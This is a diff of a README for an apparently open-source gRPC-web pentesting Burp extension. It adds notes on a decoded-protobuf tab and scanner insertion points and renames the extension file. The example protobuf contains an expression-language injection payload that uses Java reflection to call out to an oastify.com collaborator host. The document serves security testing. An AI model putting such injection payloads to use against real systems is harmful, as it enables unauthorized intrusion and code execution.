@@ -6,6 +6,26 @@ Available Content Types:
 - [x] application/grpc-web-text
 - [ ] application/grpc-web+proto ([See blackboxprotobuf Repo](https://github.com/nccgroup/blackboxprotobuf))
 
+New Features by [@plowsec](https://github.com/plowsec):
+1. Automatically Encode/Decode by New Decoded Protobuf Tab (you can directly view the decoded protobuf in the Burp tool (Repeater, Proxy, Intruder...) AND automatically encode it back if we changed anything.)
+
+![1. decoded_protobuf_tab_image](https://github.com/user-attachments/assets/293888a8-12ad-4152-913a-6883df625502)
+
+2. Scanner Insertion Points (now if you right-click on an application/grpc-web-text HTTP request / host -> Scan -> Active Scan, Burp will manage to recognize the format, decode it, insert payloads in any field, and encode it back.)
+
+
+    1: {
+      9: 0
+      10: 0
+      19: {"test"}
+      25: {
+        "#{\"\".getClass().forName(\"java.net.URL\").getConstructors()[2].newInstance(\"http:/"
+      "/xxxx.oastify.com.\").hashCode()}"
+      }
+    }
+    10: {2: 20}
+
+
 gRPC-Pentest-Suite contains these 2 tools:
 - **[grpc-scan](#grpc-coder-usage)** scanning the gRPC-web javascript webpacked files to detect grpc endpoints, services, messages and field types
 - **[grpc-coder](#grpc-coder-usage)** encoding and decoding gRPC-web payloads for pentesting (manipulating payloads)
@@ -55,7 +75,7 @@ Steps:
 
 # gRPC Coder Extension Installation
 1. Download the Whole Repository (the extension needs some files in this repo)
-2. add [grpc-coder-burp-extension.py](grpc-coder-burp-extension.py) in Burp Extensions.
+2. add [burp_grpc_extension_main.py](burp_grpc_extension_main.py) in Burp Extensions.
 
 Note: [protoscope](https://github.com/protocolbuffers/protoscope) and python3 must be system globally installed.
 
